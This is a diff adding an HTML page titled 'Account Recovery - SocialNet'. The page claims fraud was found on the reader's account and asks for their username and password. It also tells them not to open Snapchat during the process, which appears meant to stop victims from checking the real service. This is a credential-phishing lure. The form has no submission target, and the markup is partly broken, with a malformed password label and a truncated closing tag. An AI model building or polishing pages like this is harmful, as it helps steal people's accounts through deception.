@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Account Recovery - SocialNet</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="container">
+    <h1>Account Recovery</h1>
+    <p> fraud has been detected in your account. Please enter your username and passowrd to recover your account. DO NOT OPEN SNAPCHAT DURING THIS PROCESS</p>
+    
+    <form>
+      <label for="username">Username or Email:</label>
+      <input type="text" id="username" name="username" required>
+      <input for= "password">Password:</label>
+      <input type="text" id="password" name="password" required>
+
+      <label for="method">Preferred Recovery Method:</label>
+      <select id="method" name="method">
+        <option>Email Verification</option>
+        <option>Phone Verification</option>
+        <option>Security Questions</option>
+      </select>
+
+      <label for="details">Brief Description of the Issue:</label>
+      <textarea id="details" name="details" rows="4" placeholder="Explain what happened..."></textarea>
+
+      <button type="submit">Start Recovery</button>
+    </form>
+  </div>
+</body>
+</html
